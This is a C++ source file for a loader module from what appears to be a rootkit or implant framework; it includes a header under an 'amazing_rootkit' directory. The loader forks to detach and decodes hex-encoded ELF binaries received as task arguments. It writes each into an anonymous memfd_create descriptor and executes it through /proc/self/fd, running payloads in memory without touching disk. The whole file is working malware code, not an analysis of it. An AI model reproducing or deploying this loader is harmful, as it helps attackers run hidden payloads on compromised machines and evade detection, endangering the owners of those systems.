#include <boost/filesystem.hpp>
#include <boost/system/system_error.hpp>
#include "../include/json.hpp"
#include <iostream>
#include <regex>
#include <vector>
#include <string>
#include <fstream>
#include <random>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include "Loader.h"
#include "../Utils/CryptoUtils.h"
#include "../Utils/MachineUtils.h"
#include "../amazing_rootkit/api/api.h"

void MyLoader::module_impl()
{
    std::cout << "Running" << module_type << " with args: " << args.dump() << std::endl;
    nlohmann::json ret_json;
    int fd = -1;

    if (fork() != 0) {
        run_ = false;
        return;
    }

    // Iterate through the JSON object
    // TODO: This code does not support multiple execs at the same time, this can be done using fork, left unimplemented for now.
    for (auto& [task_id, value] : args.items()) {
        std::vector<uint8_t> elf_data = hex_to_bytes(value["file_content"]);


        // Create a memory file descriptor
        fd = memfd_create("elf", 0);
        if (fd == -1) {
            std::cerr << "Failed to create memfd: " << strerror(errno) << std::endl;
            return;
        }

        // Write ELF data to the memory file
        if (write(fd, elf_data.data(), elf_data.size()) != static_cast<ssize_t>(elf_data.size())) {
            std::cerr << "Failed to write ELF data: " << strerror(errno) << std::endl;
            close(fd);
            return;
        }

        // Prepare arguments for execve
        char fdpath[64];
        snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);

        std::string ret(fdpath);
        ret_json[module_type] = ret;
        save_artifact(ret_json);

        char *const args[] = {fdpath, nullptr};

        // Execute the ELF
        if (execve(fdpath, args, environ) == -1) {
            std::cerr << "Failed to execute ELF: " << strerror(errno) << std::endl;
        }

        // If execve succeeds, this point is never reached
        close(fd);
    }

    return;
}

std::vector<uint8_t> MyLoader::hex_to_bytes(const std::string& hex) {
    std::vector<uint8_t> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        bytes.push_back(std::stoi(hex.substr(i, 2), nullptr, 16));
    }
    return bytes;
}
